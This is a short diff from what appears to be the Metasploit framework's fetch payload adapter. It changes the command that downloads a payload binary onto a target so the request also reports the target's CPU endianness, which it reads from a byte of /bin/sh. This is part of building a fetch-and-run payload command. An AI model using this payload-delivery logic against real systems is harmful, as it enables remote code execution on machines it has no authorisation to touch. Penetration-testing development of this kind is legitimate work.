@@ -382,7 +382,7 @@ module Msf::Payload::Adapter::Fetch
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-    get_file_cmd << '?arch=$(uname -m)' if dynamic_arch
+    get_file_cmd << '?arch=$(uname -m)\&endian=$(printf %d \\\'$(head -c6 /bin/sh|tail -c1))' if dynamic_arch
     _execute_add(get_file_cmd)
   end
 
